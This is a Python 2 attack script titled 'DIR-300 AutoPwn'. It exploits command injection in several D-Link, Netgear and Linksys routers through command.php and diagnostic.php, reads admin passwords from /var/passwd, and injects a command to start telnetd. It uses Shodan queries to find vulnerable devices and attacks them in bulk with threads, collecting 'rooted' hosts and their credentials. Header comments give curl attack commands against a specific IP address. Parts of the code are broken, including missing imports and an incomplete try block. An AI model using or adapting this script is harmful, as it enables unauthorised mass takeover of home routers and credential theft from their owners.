#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# DIR-300 AutoPwn
#
# D-Link DIR-615, DIR-600 и DIR-300 (rev B)
# Netgear DGN1000B
# Cisco Linksys E1500/E2500
# Netgear SPH200D
#
# curl --data "cmd=cat /var/passwd" http://217.162.11.253:8080/command.php
# curl --data "act=ping&dst=%26%20ls%26" http://217.162.11.253:8080/diagnostic.php
#
# author: @090h

from Queue import Queue
from threading import Thread
from os import urandom
from time import sleep
from pprint import pprint
from shodan import WebAPI
from sys import argv, stdout
from base64 import encodestring
from requests import get, post
import logging


rooted = []


class Dir300(object):

    firmware = None
    info_urls = ['/router_info.xml', '/DevInfo.txt', '/DevInfo.php']

    def __init__(self, host, port=80):
        self.host = host
        self.port = port
        self.url = 'http://%s:%s' % (host, port)

    def do_GET(self, url):
        try:
            return self.send(url)
        except:
            return ''

    def do_POST(self, url, data=None):
        return self.send(url, data)

    def send(self, url, data=None, encode=True, encoding='UTF-8'):
        url = self.url + url
        try:
            if data is None:
                request = urllib2.Request(url)
            else:
                if encode:
                    request = urllib2.Request(url, urllib.urlencode(data))
                else:
                    request = urllib2.Request(url, data)
            response = urllib2.urlopen(request, timeout=5)
            if response.getcode() != 200:
                return 'ERROR: %i' % response.getcode()

            return response.read().decode(encoding, "replace")
        except IOError, e:
            return ''

    def basic_auth(self, username='admin', password='admin'):
        request = urllib2.Request(self.url)
        base64string = encodestring('%s:%s' % (username, password)).replace('\n', '')
        request.add_header("Authorization", "Basic %s" % base64string)
        return urllib2.urlopen(request).read()

    def vct(self):
        return self.do_GET('/tools_vct.xgi?set/runtime/switch/getlinktype=1&set/runtime/diagnostic/pingIp=1.1.1.1`telnetd`&pingIP=1.1.1.1')

    @property
    def info(self):
        res = ''
        for url in self.info_urls:
            print('Quering %s' % url)
            resp = self.do_GET(url).strip('\n\n')
            res += resp
            #print resp
        return res

    @property
    def firmware(self):
        res = ''
        for block in self.info:
            for line in block.split('\n'):
                if line.find('Firmware') != -1:
                    res += line + '\n'
        return res

    def command(self, cmd):
        out = self.send('/command.php', 'cmd=%s' % cmd, encode=False)
        if out.find('Authenication fail') != -1:
            return ''

        return out

    def command_blind(self, cmd):
        out = self.send('/diagnostic.php', 'act=ping&dst=%26%20'+cmd+'%26', encode=False)
        if out.find('Authenication fail') != -1:
            return ''

        return out


class DlinkThread(Thread):

    def __init__(self, queue, cmd):
        Thread.__init__(self, name=urandom(16).encode('hex'))
        self.queue = queue
        self.cmd = cmd

    def run(self):
        while True:
            try:
                ip, port = self.queue.get()
                d = Dir300(ip)
                firmware = d.firmware
                if firmware != '':
                    print ip,port,firmware


                cmdout = d.command(self.cmd).strip()
                if cmdout != '':
                    pwd = cmdout.split(' ')[1].replace('"', '')
                    #cmdout = 'admin:'+ pwd[1] + '*'*len(pwd)-2 + pwd[-1:]
                    cmdout = 'admin:'+ pwd
                    #be ethical
                    #cmdout = '*'*len(pwd)

                    print('Rooted %s:%i => %s' % (ip, port, cmdout))
                    rooted.append((ip, port, firmware, cmdout))
            finally:
                self.queue.task_done()


class DlinkManager(object):

    def __init__(self, targets, cmd='cat /var/passwd', thread_count=10):
        self.targets = targets
        self.thread_count = thread_count
        self.cmd = cmd

    def run(self):
        self.queue = Queue()
        for i in range(self.thread_count):
            t = DlinkThread(self.queue, self.cmd)
            t.setDaemon(True)
            t.start()

        logging.info('Filling queue with %i items' % len(self.targets))
        for target in self.targets:
            self.queue.put((target['ip'], target['port']))
        init_size = self.queue.qsize()

        current_count = 0
        while not self.queue.empty():
            q = init_size - self.queue.qsize()
            #stdout.write("\r%i/%i checked. Check speed %i per sec  " % (q, init_size, q - current_count))
            #stdout.flush()
            current_count = q
            sleep(1)
        return

def exploit(host, port=80):
    d = Dir300(host, port)
    print("INFO: %s\nFIRMWARE: %s\n" % (d.info, d.firmware))
    print(d.command('cat /var/passwd'))
    #print(d.command_blind('cat /var/passwd'))

def autoroot(api_key, thread_count=10):

        # Don't bother to register and get it.
        api_key = raw_input("Shodan API Key: ")
        if api_key is None or len(api_key) == 0:
            print('Go and get SHODAN_API_KEY at http://www.shodanhq.com/')
            exit()

        try:
            api = WebAPI(api_key)
        search_queries = ['Server: Linux, HTTP/1.1, DIR','Mathopd/1.5p6' ]#, 'Server: Linux, HTTP/1.1, DIR-300']
        for query in search_queries:
            count = 0
            page = 1
            total = 0

            while True:
                results = api.search(query)
                if total == 0:
                    total = int(results['total'])
                    print('Results found: %s' % results['total'])
                    print('Countries found: ')
                    pprint(results['countries'])
                    raw_input('press enter to start hacking')
                dm = DlinkManager(results['matches'],thread_count=10)
                dm.run()
                page += 1
                count += len(results['matches'])
                if count == total:
                    break

        print("Rooted routers count: %i"%len(rooted))
        print(rooted)

if __name__ == '__main__':

    if len(argv) == 1:
        print('No args found, try to query Shodan...')
    else:
        port = 80
        if len(argv) > 2:
            try:
                port = int(argv[2])
            except:
                print('Invalid port: %s' % argv[2])
                exit()
        exploit(argv[1],port)
